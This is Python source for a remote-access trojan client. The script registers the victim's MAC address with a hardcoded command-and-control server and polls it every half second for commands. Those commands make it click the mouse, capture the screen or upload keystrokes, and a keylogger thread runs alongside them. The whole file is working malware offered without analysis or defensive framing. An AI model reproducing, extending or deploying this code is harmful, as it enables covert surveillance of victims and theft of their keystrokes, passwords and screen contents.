# -*- coding: utf-8 -*-

import re
import threading, time
import urllib.request, urllib.parse
from module.win import *

cc_serv = 'http://www.r41n.shop'
cmd = ''

def post_data(url, data):
	try:
		data = urllib.parse.urlencode(data).encode('utf-8')
		with urllib.request.urlopen(url, data=data) as res:
			return res.read().decode('utf-8')
	except urllib.error.HTTPError:
		pass

def get_data():
	try:
		data = {'c_conf': get_addr()}
		resv = re.sub('[\[\'\],\r\n]', '', post_data(cc_serv, data))
		cmd = resv.split(' ')
		if resv != '':
			if cmd[0] == 'click':
				if cmd[2] == '-c':
					win_click(cmd[1], False, cmd[3], cmd[4])
				elif cmd[2] == '-dc':
					win_click(cmd[1], True, cmd[3], cmd[4])
				else: raise
				post_data(cc_serv, {'user': get_addr(), 'cmd': resv, 'resp': 'Command execution succeeded.'})
			elif cmd[0] == 'cap':
				result = win_capture()
				if not result[0]:
					post_data(cc_serv, {'user': get_addr(), 'cmd': resv, 'resp': result[1]})
				else:
					raise
			elif cmd[0] == 'log':
				if post_keyLog():
					print('ddd')
					raise
				else:
					post_data(cc_serv, {'user': get_addr(), 'cmd': resv, 'resp': 'Command execution succeeded.'})
					print(1)
	except Exception as e:
		print(e)
		post_data(cc_serv, {'user': get_addr(), 'cmd': resv, 'resp': 'Command execution failed.'})

def key_logger():
	with Listener(on_press=on_press, on_release=on_release) as listener:
		listener.join()

class Timer(threading.Thread):

	def __init__(self, interval, handler):
		super().__init__()
		self.interval = interval
		self.lock = threading.Lock()
		self.b_stop = False
		self.handler = handler

	def stop(self):
		with self.lock:
			self.b_stop = True

	def run(self):
		while True:
			with self.lock:
				if self.b_stop: return
				self.handler()
				time.sleep(self.interval)

if __name__ == '__main__':
	mac_addr = get_addr()
	post_data(cc_serv, {'reg_user': mac_addr})
	th_cmd = Timer(0.5, get_data)
	th_keylogger = Timer(0, key_logger)
	th_cmd.start()
	th_keylogger.start()